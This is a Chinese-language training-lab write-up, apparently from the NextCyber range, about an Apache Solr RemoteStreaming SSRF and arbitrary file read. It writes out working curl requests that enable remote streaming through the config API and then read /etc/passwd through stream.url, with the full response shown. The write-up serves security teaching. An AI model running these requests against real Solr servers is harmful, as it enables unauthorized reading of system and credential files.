# Apache Solr RemoteStreaming 文件读取与SSRF漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | CNVD-2019-xxxxx |
| **影响版本** | Apache Solr |
| **漏洞类型** | SSRF / 任意文件读取 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 8983 |
| **漏洞链接** | [NVD - CVE-2019-xxxxx](https://nvd.nist.gov/vuln/detail/CVE-2019-xxxxx) |



## 漏洞概述

`Apache Solr` 是一个开源的搜索服务器。在 `Apache Solr` 未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成 `SSRF` 或任意文件读取。



## 漏洞复现

靶机启动后，访问 `http://your-ip:8983` 即可查看 `Apache Solr` 后台：

![Solr 后台界面](https://static.nextcyber.cn/attachments/images/course/task/0ae0a7164b204a48aa4c4f247c62fc49.png)

靶机是 `solr 8.8.1` 服务。首先，获取 `数据库名`，直接访问：

```
http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json
```

![获取数据库名](https://static.nextcyber.cn/attachments/images/course/task/0093b60c72de4803badcc2c783d1558f.png)

发送如下数据包，修改数据库 `demo` 的配置，开启 `RemoteStreaming`：

```
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'
```

```
┌──(root㉿nextcyber)-[~]
└─# curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://192.168.1.3:8983/solr/demo/config'
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; base-uri 'none'; connect-src 'self'; form-action 'self'; font-src 'self'; frame-ancestors 'none'; img-src 'self'; media-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; worker-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Type: text/plain;charset=utf-8
Content-Length: 149

{
  "responseHeader":{
    "status":0,
    "QTime":234},
  "WARNING":"This response format is experimental.  It is likely to change in the future."}
```

## 漏洞利用

最后通过 `stream.url` 读取任意文件：

```
curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

```
┌──(root㉿nextcyber)-[~]
└─# curl -i -s -k 'http://192.168.1.3:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; base-uri 'none'; connect-src 'self'; form-action 'self'; font-src 'self'; frame-ancestors 'none'; img-src 'self'; media-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; worker-src 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Type: application/json;charset=utf-8
Content-Length: 1497

{
  "responseHeader":{
    "status":0,
    "QTime":14,
    "handler":"org.apache.solr.handler.DumpRequestHandler",
    "params":{
      "param":"ContentStreams",
      "stream.url":"file:///etc/passwd"}},
  "params":{
    "stream.url":"file:///etc/passwd",
    "echoHandler":"true",
    "param":"ContentStreams",
    "echoParams":"explicit"},
  "streams":[{
      "name":null,
      "sourceInfo":"url",
      "size":null,
      "contentType":null,
      "stream":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"}],
  "context":{
    "webapp":"/solr",
    "path":"/debug/dump",
    "httpMethod":"GET"}}
```

成功读取 `/etc/passwd` 文件。



## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/150) 在线实战演练上述漏洞。



> ⚠️ **免责声明**：本目录所有内容仅供学习研究使用，请勿用于非法用途。
